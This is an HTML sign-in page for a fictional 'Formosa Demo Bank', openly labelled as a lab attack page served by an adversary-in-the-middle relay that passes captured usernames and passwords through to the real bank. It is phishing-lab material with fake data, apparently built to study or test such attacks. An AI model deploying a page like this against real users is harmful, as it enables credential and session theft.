<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Formosa Demo Bank - Sign in</title></head>
<body>
  <h1>Formosa Demo Bank</h1>
  <p style="color:#a00">LAB ATTACK PAGE (served by the AiTM relay origin) - posts SAME-ORIGIN; the
     relay forwards server-side to the real bank and returns the bank's genuine response. Fake data only.</p>
  <input name="username" placeholder="Username">
  <input name="password" type="password" placeholder="Password">
  <button type="button" id="signin">Sign in</button>
  <p id="result"></p>
  <script>
    document.getElementById("signin").addEventListener("click", async () => {
      const u = document.querySelector('input[name="username"]').value;
      const p = document.querySelector('input[name="password"]').value;
      // Same-origin POST to the relay; the relay forwards to the bank server-side.
      const r = await fetch("/login", {
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: "username=" + u + "&password=" + p,
      });
      document.getElementById("result").textContent = (r.ok ? "SUCCESS: " : "ERROR: ") + (await r.text());
    });
  </script>
</body></html>
